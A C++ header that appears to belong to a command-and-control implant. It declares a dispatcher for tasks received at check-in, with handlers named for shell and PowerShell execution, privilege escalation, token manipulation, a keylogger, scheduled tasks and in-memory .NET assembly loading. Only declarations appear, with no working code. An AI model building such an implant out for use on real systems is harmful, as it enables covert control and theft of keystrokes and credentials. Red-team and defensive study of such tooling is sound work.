// ========================================== { START OF FILE } ========================================== //
#pragma once

#include <string>

#include "agent/commands/command_result.h"
#include "agent/models/checkin_models.h"

namespace agent::commands {

    class CommandDispatcher {
       public:
        /// <summary>
        /// Validates and executes one task.
        /// </summary>
        /// <param name="task">The task parsed from the check-in response.</param>
        /// <returns>
        /// Ok with the command's output, or Error naming what was wrong. The caller must map
        /// <c>success</c> onto the task's Status - a diagnostic string alone is not a signal.
        /// </returns>
        [[nodiscard]] static CommandResult Dispatch(const models::CheckinResponse& task);

       private:
        static CommandResult HandlePowerShell(const models::CheckinResponse& task);
        static CommandResult HandleShell(const models::CheckinResponse& task);
        static CommandResult HandlePrivesc(const models::CheckinResponse& task);
        static CommandResult HandleRunU(const models::CheckinResponse& task);
        static CommandResult HandleKillProcess(const models::CheckinResponse& task);
        static CommandResult HandleToken(const models::CheckinResponse& task);
        static CommandResult HandleKeylogger(const models::CheckinResponse& task);
        static CommandResult HandleWinTask(const models::CheckinResponse& task);
        static CommandResult HandleNetAsm(const models::CheckinResponse& task);
        static CommandResult HandleGetUid(const models::CheckinResponse& task);
        static CommandResult HandleKillAgent(const models::CheckinResponse& task);
    };

}  // namespace agent::commands
// ========================================== { END OF FILE } ========================================== //
